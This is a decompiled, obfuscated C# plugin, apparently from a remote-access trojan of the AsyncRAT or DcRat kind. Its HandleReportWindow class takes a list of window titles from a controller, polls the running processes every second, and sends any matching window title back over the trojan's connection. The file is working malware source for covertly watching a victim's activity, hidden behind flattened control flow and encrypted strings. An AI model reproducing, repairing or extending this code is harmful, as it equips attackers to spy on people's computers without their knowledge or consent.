using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Handler;

internal class HandleReportWindow
{
	private List<string> title;

	internal static object HxstJZemWsLNaZlO8fi;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public HandleReportWindow(MsgPack unpack_msgpack)
	{
		M0eNcRekqrIlVIsj7Jv();
		base._002Ector();
		int num = 9;
		int num4 = default(int);
		int num5 = default(int);
		int num3 = default(int);
		Process process = default(Process);
		Process[] array = default(Process[]);
		string text = default(string);
		int num8 = default(int);
		while (true)
		{
			switch (num)
			{
			case 4:
				try
				{
					Initialize(unpack_msgpack);
					int num2 = 16;
					while (true)
					{
						switch (num2)
						{
						case 7:
							num4++;
							num5 = 2;
							goto IL_006f;
						default:
							num3++;
							num2 = 4;
							break;
						case 11:
						case 19:
							if (Jf1XmteL3NMZO016kgY(Packet.ctsReportWindow, XyAkEYmQrC6hk4SPCb.cV7dc3DORd))
							{
								num2 = 14;
								break;
							}
							goto case 6;
						case 16:
							num4 = 30;
							num2 = 13;
							if (true)
							{
								num2 = 19;
							}
							break;
						case 10:
							num4 = 0;
							num2 = 12;
							break;
						case 17:
							if (num4 > 30)
							{
								num5 = 10;
								goto IL_006f;
							}
							goto default;
						case 9:
						case 18:
							process = array[num3];
							num2 = 8;
							break;
						case 1:
						case 4:
							if (num3 < array.Length)
							{
								num5 = 9;
								goto IL_006f;
							}
							goto case 7;
						case 13:
							if (!title.Any(((string)LjCcQIewZvKmFPsENX1(LjCcQIewZvKmFPsENX1(process, fcGBqSfI6agO2H8KPL.HWJdpwTv4k), fcGBqSfI6agO2H8KPL.UWFdFQc1Ub)).Contains))
							{
								num2 = 15;
								break;
							}
							goto case 17;
						case 8:
							if (QrsIDuesi5ylawFZ70b(LjCcQIewZvKmFPsENX1(process, fcGBqSfI6agO2H8KPL.HWJdpwTv4k), j8NQFMPFbUQV9kOvG1.wK4dt3Wytj))
							{
								num2 = 0;
								if (true)
								{
									break;
								}
								goto IL_006f;
							}
							goto case 13;
						case 3:
							num3 = 0;
							num2 = 1;
							if (0 == 0)
							{
								break;
							}
							goto IL_006f;
						case 6:
							array = (Process[])ST7T68eSvTJDVv9qZDC(MbhnUTdICJWURfNGwsZ.aM5dLCo66w);
							num2 = 3;
							if (false)
							{
								num2 = 1;
							}
							break;
						case 2:
							dm6L8Sddtfk8nZl9TIp.M2CdmcGqT(1000, dm6L8Sddtfk8nZl9TIp.E0Ndx6rYcU);
							num2 = 11;
							break;
						case 12:
							SendReport((string)LjCcQIewZvKmFPsENX1(LjCcQIewZvKmFPsENX1(process, fcGBqSfI6agO2H8KPL.HWJdpwTv4k), fcGBqSfI6agO2H8KPL.UWFdFQc1Ub));
							num2 = 5;
							if (0 == 0)
							{
								num2 = 5;
							}
							break;
						case 14:
							return;
							IL_006f:
							num2 = num5;
							break;
						}
					}
				}
				catch
				{
					int num6 = 0;
					if (1 == 0)
					{
						int num7;
						num6 = num7;
					}
					switch (num6)
					{
					case 0:
						break;
					}
					return;
				}
			case 3:
				return;
			case 1:
				num = 4;
				break;
			case 10:
			{
				CancellationTokenSource ctsReportWindow = Packet.ctsReportWindow;
				if (ctsReportWindow == null)
				{
					num = 8;
					break;
				}
				AdScFVePqjc697Ii7KP(ctsReportWindow, JZGqsP7dTwImnY3EdB.QaxdajGAii);
				num = 2;
				break;
			}
			case 5:
				return;
			case 6:
				return;
			case 9:
				text = (string)XlV17veQNnNhnnSmxAT(ishPVievaFjASNRytoS(unpack_msgpack, hcffkoeCXcmuwQgMAuP(342)));
				num = 7;
				if (1 == 0)
				{
					num = 6;
				}
				break;
			case 11:
				if (!y7yxuaeIm5iBTpRyadv(text, hcffkoeCXcmuwQgMAuP(566), pPt02GdZ8jnlR2ZSHSu.ll9dUeCNlG))
				{
					num = 0;
					if (true)
					{
						num = 3;
					}
					break;
				}
				goto case 10;
			case 2:
			case 8:
				Connection.Disconnected();
				num = 5;
				if (0 == 0)
				{
					break;
				}
				goto IL_001f;
			default:
				if (y7yxuaeIm5iBTpRyadv(text, hcffkoeCXcmuwQgMAuP(556), pPt02GdZ8jnlR2ZSHSu.ll9dUeCNlG))
				{
					num = 1;
					if (false)
					{
						num = 0;
					}
					break;
				}
				goto case 11;
			case 7:
				{
					if (text == null)
					{
						num = 6;
						if (0 == 0)
						{
							break;
						}
						goto IL_001f;
					}
					goto default;
				}
				IL_001f:
				num = num8;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Initialize(MsgPack unpack_msgpack)
	{
		int num = 7;
		string text = default(string);
		string[] array = default(string[]);
		int num3 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 4:
				case 10:
					text = array[num3];
					num2 = 9;
					continue;
				case 7:
				{
					CancellationTokenSource ctsReportWindow = Packet.ctsReportWindow;
					if (ctsReportWindow == null)
					{
						num2 = 6;
						if (VSjysfeZvIsTXG0JhkU() == null)
						{
							continue;
						}
					}
					else
					{
						AdScFVePqjc697Ii7KP(ctsReportWindow, JZGqsP7dTwImnY3EdB.QaxdajGAii);
						num = 5;
					}
					break;
				}
				default:
					num3++;
					num2 = 0;
					if (bCAviZeugmnrd5oqZNC())
					{
						num2 = 3;
					}
					continue;
				case 12:
					num3 = 0;
					num2 = 1;
					if (VSjysfeZvIsTXG0JhkU() != null)
					{
						num2 = 1;
					}
					continue;
				case 8:
					title = new List<string>();
					num2 = 13;
					if (VSjysfeZvIsTXG0JhkU() == null)
					{
						continue;
					}
					break;
				case 5:
				case 6:
					Packet.ctsReportWindow = new CancellationTokenSource();
					num2 = 0;
					if (VSjysfeZvIsTXG0JhkU() == null)
					{
						num2 = 2;
					}
					continue;
				case 11:
					return;
				case 9:
					title.Add((string)LjCcQIewZvKmFPsENX1(text, fcGBqSfI6agO2H8KPL.i7EdjQWLit));
					num2 = 0;
					if (VSjysfeZvIsTXG0JhkU() == null)
					{
						continue;
					}
					break;
				case 2:
				{
					MsgPack msgPack = new MsgPack();
					eToZBNe6ZyNp3lM6Xtu(ishPVievaFjASNRytoS(msgPack, hcffkoeCXcmuwQgMAuP(0)), hcffkoeCXcmuwQgMAuP(578));
					Connection.Send((byte[])ogXAaoef1cb99tGHbIr(msgPack));
					num = 8;
					break;
				}
				case 13:
					array = (string[])f0Y1EDe8Af5xEA8UOW0(LjCcQIewZvKmFPsENX1(XlV17veQNnNhnnSmxAT(ishPVievaFjASNRytoS(unpack_msgpack, hcffkoeCXcmuwQgMAuP(608))), fcGBqSfI6agO2H8KPL.UWFdFQc1Ub), new string[1] { nCP5vtxT3QjsSeuiK3.xuCtsHmOK(622) }, StringSplitOptions.None, nch06idCGLMsHCxvIWj.KBXdO85D2j);
					num2 = 12;
					if (bCAviZeugmnrd5oqZNC())
					{
						continue;
					}
					break;
				case 1:
				case 3:
					if (num3 >= array.Length)
					{
						return;
					}
					num2 = 10;
					if (bCAviZeugmnrd5oqZNC())
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void SendReport(string window)
	{
		int num = 1;
		while (true)
		{
			int num2 = num;
			do
			{
				switch (num2)
				{
				default:
					return;
				case 1:
					break;
				case 0:
					return;
				}
				MsgPack msgPack = new MsgPack();
				((MsgPack)ishPVievaFjASNRytoS(msgPack, hcffkoeCXcmuwQgMAuP(0))).AsString = (string)hcffkoeCXcmuwQgMAuP(174);
				msgPack.ForcePathObject((string)hcffkoeCXcmuwQgMAuP(628)).AsString = window;
				Connection.Send((byte[])ogXAaoef1cb99tGHbIr(msgPack));
				num2 = 0;
			}
			while (bCAviZeugmnrd5oqZNC());
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void M0eNcRekqrIlVIsj7Jv()
	{
		WkMgYHbfSUMGdoITRx.f48kVQAz0ZYuA();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object hcffkoeCXcmuwQgMAuP(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object ishPVievaFjASNRytoS(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object XlV17veQNnNhnnSmxAT(object P_0)
	{
		return ((MsgPack)P_0).AsString;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool y7yxuaeIm5iBTpRyadv(object P_0, object P_1, object P_2)
	{
		return pPt02GdZ8jnlR2ZSHSu.M2CdmcGqT((string)P_0, (string)P_1, (pPt02GdZ8jnlR2ZSHSu)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object ST7T68eSvTJDVv9qZDC(object P_0)
	{
		return MbhnUTdICJWURfNGwsZ.M2CdmcGqT((MbhnUTdICJWURfNGwsZ)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object LjCcQIewZvKmFPsENX1(object P_0, object P_1)
	{
		return fcGBqSfI6agO2H8KPL.M2CdmcGqT(P_0, (fcGBqSfI6agO2H8KPL)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool QrsIDuesi5ylawFZ70b(object P_0, object P_1)
	{
		return j8NQFMPFbUQV9kOvG1.M2CdmcGqT((string)P_0, (j8NQFMPFbUQV9kOvG1)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool Jf1XmteL3NMZO016kgY(object P_0, object P_1)
	{
		return XyAkEYmQrC6hk4SPCb.M2CdmcGqT(P_0, (XyAkEYmQrC6hk4SPCb)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void AdScFVePqjc697Ii7KP(object P_0, object P_1)
	{
		JZGqsP7dTwImnY3EdB.M2CdmcGqT(P_0, (JZGqsP7dTwImnY3EdB)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool bCAviZeugmnrd5oqZNC()
	{
		return HxstJZemWsLNaZlO8fi == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandleReportWindow VSjysfeZvIsTXG0JhkU()
	{
		return (HandleReportWindow)HxstJZemWsLNaZlO8fi;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void eToZBNe6ZyNp3lM6Xtu(object P_0, object P_1)
	{
		((MsgPack)P_0).AsString = (string)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object ogXAaoef1cb99tGHbIr(object P_0)
	{
		return ((MsgPack)P_0).Encode2Bytes();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object f0Y1EDe8Af5xEA8UOW0(object P_0, object P_1, StringSplitOptions P_2, object P_3)
	{
		return nch06idCGLMsHCxvIWj.M2CdmcGqT(P_0, (string[])P_1, P_2, (nch06idCGLMsHCxvIWj)P_3);
	}
}
